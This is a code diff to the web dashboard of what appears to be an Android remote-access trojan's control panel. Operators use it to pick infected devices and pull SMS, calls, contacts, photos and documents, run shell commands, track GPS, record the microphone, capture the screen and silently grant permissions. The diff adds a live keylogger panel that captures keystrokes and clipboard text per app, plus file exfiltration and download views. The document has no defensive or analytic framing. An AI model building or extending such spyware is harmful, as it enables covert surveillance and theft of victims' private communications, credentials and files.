@@ -6,8 +6,8 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:monospace;background:#0a0e14;color:#c8d6e5;display:flex;height:100vh}
-#sidebar{width:300px;background:#111820;padding:15px;overflow-y:auto;border-right:1px solid #1e2a3a}
-#main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px}
+#sidebar{width:300px;background:#111820;padding:15px;overflow-y:auto;border-right:1px solid #1e2a3a;flex-shrink:0}
+#main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px;min-width:0}
 h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
 .device{border:1px solid #1e2a3a;padding:10px;margin-bottom:6px;border-radius:4px;cursor:pointer}
 .device:hover,.device.sel{border-color:#4da6ff}
@@ -20,8 +20,24 @@ h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
 .btn{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-family:monospace;margin:2px}
 .btn:hover{background:#2ea043}
 .btn:disabled{opacity:0.3;cursor:not-allowed}
-#output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word}
+.btn.amber{background:#3a2a1a;border-color:#e0912e}
+.btn.amber:hover{background:#e0912e}
+.btn.red{background:#3a1a1a;border-color:#f85149}
+.btn.red:hover{background:#f85149}
+#output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px}
 #toolbar{display:flex;flex-wrap:wrap;gap:4px}
+#keylog{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px;max-height:40vh}
+.kl-line{border-bottom:1px solid #1e2a3a;padding:2px 0}
+.kl-pkg{color:#4da6ff}
+.kl-txt{color:#e6edf3}
+.file-row{display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid #161d28}
+.file-row .nm{flex:1;color:#c8d6e5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.file-row .sz{color:#5a6e82;font-size:11px}
+.file-row button{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:2px 8px;border-radius:3px;cursor:pointer;font-size:11px;font-family:monospace}
+.file-row button:hover{background:#2ea043}
+img.preview{max-width:100%;max-height:400px;border:1px solid #1e2a3a;border-radius:4px;margin:6px 0}
+a.dl{color:#4da6ff;text-decoration:underline}
+.panel-label{font-size:11px;color:#5a6e82;margin:6px 0 2px}
 </style>
 </head>
 <body>
@@ -36,18 +52,36 @@ h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
     <button class="btn" data-cmd="sms,list" data-params='{"count":"10"}'>SMS</button>
     <button class="btn" data-cmd="calls,list" data-params='{"count":"20"}'>Calls</button>
     <button class="btn" data-cmd="contacts,list">Contacts</button>
-    <button class="btn" data-cmd="files,list" data-params='{"type":"images","count":"20"}'>Files</button>
+    <button class="btn" data-cmd="files,list" data-params='{"type":"images","count":"20"}'>Images</button>
+    <button class="btn" data-cmd="files,list" data-params='{"type":"files","count":"20"}'>Docs</button>
     <button class="btn" data-cmd="shell,exec" data-params='{"cmd":"id"}'>Shell</button>
     <button class="btn" data-cmd="location,get">GPS</button>
     <button class="btn" data-cmd="mic,record" data-params='{"duration":"10"}'>Mic</button>
     <button class="btn" data-cmd="camera,screenshot">Screen</button>
     <button class="btn" data-cmd="silent_grant,grant">Grant</button>
   </div>
+  <div id="ktoolbar">
+    <button class="btn amber" data-cmd="keylog,start">Keylog Start</button>
+    <button class="btn red" data-cmd="keylog,stop">Keylog Stop</button>
+    <button class="btn" data-cmd="keylog,dump">Keylog Dump</button>
+    <button class="btn" data-cmd="keylog,status">Keylog Status</button>
+  </div>
+  <div class="panel-label">KEYSTROKES (live)</div>
+  <div id="keylog">Keylogger idle. Click "Keylog Start".</div>
+  <div class="panel-label">RESULT</div>
   <div id="output">Waiting...</div>
 </div>
 <script>
 var activeId = '';
 var deviceData = {};
+var lastListType = 'images';
+
+function esc(s){
+  if(s===null||s===undefined) return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function safeParse(s){ try{ return typeof s === 'string' ? JSON.parse(s) : s; }catch(e){ return null; } }
 
 async function fetchDevs(){
   try{
@@ -56,7 +90,6 @@ async function fetchDevs(){
     deviceData = {};
     (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
     if(!activeId || !deviceData[activeId]){
-      // Auto-select: prefer online, fallback to any device
       activeId = '';
       for(var k in deviceData){if(deviceData[k].online){activeId=k;break;}}
       if(!activeId){ for(var k in deviceData){activeId=k;break;} }
@@ -71,9 +104,9 @@ function renderSidebar(){
   for(var k in deviceData){
     var d = deviceData[k];
     html += '<div class="device'+(k===activeId?' sel':'')+'" onclick="select(\''+k+'\')">';
-    html += '<span class="dot '+(d.online?'on':'off')+'"></span>';
-    html += '<span class="id">'+k.substring(0,16)+'...</span>';
-    html += '<div class="info">'+(d.info.model||'?')+' | SDK '+(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
+    html += '<span class="dot '+(d.online?'on':'off')+'\"></span>';
+    html += '<span class="id">'+esc(k.substring(0,16))+'...</span>';
+    html += '<div class="info">'+esc(d.info.model||'?')+' | SDK '+esc(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
     html += '</div>';
   }
   document.getElementById('devlist').innerHTML = html || 'No devices';
@@ -85,6 +118,7 @@ function select(id){ activeId = id; renderSidebar(); }
 
 async function sendCmd(mod, act, params){
   if(!activeId) return alert('No device selected');
+  if(mod==='files' && act==='list' && params && params.type) lastListType = params.type;
   document.getElementById('output').textContent = 'Sending '+mod+'/'+act+'...';
   try{
     var r = await fetch('/api/command',{
@@ -109,30 +143,134 @@ document.querySelectorAll('.btn[data-cmd]').forEach(function(btn){
   });
 });
 
-// SSE
+function humanSize(b){
+  if(b===null||b===undefined) return '';
+  if(b>1048576) return (b/1048576).toFixed(1)+' MB';
+  if(b>1024) return (b/1024).toFixed(1)+' KB';
+  return b+' B';
+}
+
+// ── Renderers ───────────────────────────────────────────────────────────
+
+function renderFiles(entries, listType){
+  var out = document.getElementById('output');
+  var html = '<b>Files ('+entries.length+')</b>\n';
+  entries.forEach(function(f){
+    var id = esc(f.id);
+    var nm = esc(f.name||'');
+    html += '<div class="file-row">';
+    html += '<span class="nm" title="'+esc(f.path||'')+'">'+nm+'</span>';
+    html += '<span class="sz">'+humanSize(f.size)+'</span>';
+    html += '<button onclick="readFile(\''+id+'\',\''+listType+'\',\''+nm.replace(/'/g,'\\\'')+'\')">view</button>';
+    html += '</div>';
+  });
+  out.innerHTML = html;
+}
+
+function readFile(id, type, name){
+  sendCmd('files','read',{id:id, type:type, name:name});
+}
+
+function renderFileContent(p){
+  var out = document.getElementById('output');
+  var mime = p.mime_type||'application/octet-stream';
+  var name = p.file_name||('file_'+p.file_id);
+  var dataUri = 'data:'+mime+';base64,'+p.base64_data;
+  var html = '<b>'+esc(name)+'</b> <span class="sz">('+humanSize(p.size_bytes)+', '+esc(mime)+')</span><br>';
+  if(mime.indexOf('image/')===0){
+    html += '<img class="preview" src="'+dataUri+'" alt="'+esc(name)+'">';
+    html += '<br><a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download image</a>';
+  }else if(mime.indexOf('video/')===0 || mime.indexOf('audio/')===0){
+    html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download '+esc(name)+' ('+humanSize(p.size_bytes)+')</a>';
+  }else{
+    html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download '+esc(name)+' ('+humanSize(p.size_bytes)+')</a>';
+  }
+  out.innerHTML = html;
+}
+
+function appendKeylog(p){
+  var kl = document.getElementById('keylog');
+  if(kl.textContent.indexOf('Keylogger idle')===0 || kl.textContent.indexOf('Keystrokes')===0){
+    kl.textContent = '';
+  }
+  var div = document.createElement('div');
+  div.className = 'kl-line';
+  var ts = new Date().toLocaleTimeString();
+  div.innerHTML = '<span class="kl-pkg">['+ts+' '+esc(p.package_name||p.keylog_package||'?')+']</span> <span class="kl-txt">'+esc(p.keylog_text||p.clipboard_text||'')+'</span>';
+  kl.appendChild(div);
+  kl.scrollTop = kl.scrollHeight;
+}
+
+// ── SSE ─────────────────────────────────────────────────────────────────
+
 function sse(){
   var es = new EventSource('/api/events');
   es.onmessage = function(e){
     try{
-      var r = JSON.parse(e.data);
+      var r = JSON.parse(e.data);              // DashboardResult
+      var env = safeParse(r.data);             // ResponseEnvelope (JSON string)
       var out = document.getElementById('output');
-      // Try to extract readable data from various response types
-      if(r.payload && r.payload.type === 'sms_list'){
-        out.textContent = 'SMS ('+r.payload.count+'):\n'+JSON.stringify(r.payload.messages,null,2);
-      }else if(r.payload && r.payload.type === 'contacts_list'){
-        out.textContent = 'Contacts ('+r.payload.count+'):\n'+JSON.stringify(r.payload.contacts,null,2);
-      }else if(r.payload && r.payload.type === 'file_list'){
-        out.textContent = 'Files:\n'+JSON.stringify(r.payload.entries,null,2);
-      }else if(r.payload && r.payload.type === 'shell'){
-        out.textContent = 'Shell:\n'+r.payload.stdout;
-      }else if(r.payload && r.payload.type === 'device_info'){
-        out.textContent = 'Device:\n'+JSON.stringify(r.payload,null,2);
-      }else if(r.payload && r.payload.type === 'mic_recording'){
-        out.textContent = 'Mic recording: '+r.payload.duration_seconds+'s, '+r.payload.size_bytes+' bytes';
-      }else if(r.error){
-        out.textContent = 'Error: '+r.error;
-      }else{
-        out.textContent = JSON.stringify(r,null,2);
+      if(!env){ return; }
+
+      var p = env.payload || null;
+
+      // Error envelope
+      if(env.status === 'error' || (p && p.type === 'error')){
+        out.textContent = 'Error: ' + ((p && p.error) || env.error || 'unknown');
+        return;
+      }
+      if(!p){ out.textContent = JSON.stringify(env,null,2); return; }
+
+      switch(p.type){
+        case 'file_list':
+          renderFiles(p.entries||[], lastListType);
+          break;
+        case 'file_read':
+          if(p.base64_data) renderFileContent(p);
+          else out.textContent = 'File read empty: '+JSON.stringify(p,null,2);
+          break;
+        case 'keylog_dump':
+          var kd = document.getElementById('keylog');
+          kd.textContent = 'Keylog dump ('+p.count+'):\n';
+          (p.keystrokes||[]).forEach(function(k){
+            kd.textContent += '['+new Date(k.timestamp).toLocaleString()+'] '+k.package_name+': '+k.text+'\n';
+          });
+          break;
+        case 'live_status':
+          out.textContent = 'Status: '+p.status+' '+JSON.stringify(p.monitors||{});
+          break;
+        case 'live_event':
+          if(p.event_type === 'keystroke'){
+            appendKeylog(p);
+          }else{
+            out.textContent = 'Event: '+JSON.stringify(p,null,2);
+          }
+          break;
+        case 'sms_list':
+          out.textContent = 'SMS ('+p.count+'):\n'+JSON.stringify(p.messages,null,2);
+          break;
+        case 'contacts_list':
+          out.textContent = 'Contacts ('+p.count+'):\n'+JSON.stringify(p.contacts,null,2);
+          break;
+        case 'shell':
+          out.textContent = 'Shell:\n'+(p.stdout||'')+(p.stderr?'\nSTDERR:\n'+p.stderr:'');
+          break;
+        case 'device_info':
+          out.textContent = 'Device:\n'+JSON.stringify(p,null,2);
+          break;
+        case 'mic_recording':
+          out.textContent = 'Mic recording: '+p.duration_seconds+'s, '+p.size_bytes+' bytes';
+          break;
+        case 'screenshot':
+        case 'camera':
+          if(p.image_base64){
+            out.innerHTML = '<img class="preview" src="data:image/'+(p.format||'png').toLowerCase()+';base64,'+p.image_base64+'" alt="capture">';
+          }else{
+            out.textContent = JSON.stringify(p,null,2);
+          }
+          break;
+        default:
+          out.textContent = JSON.stringify(p,null,2);
       }
     }catch(ex){}
   };
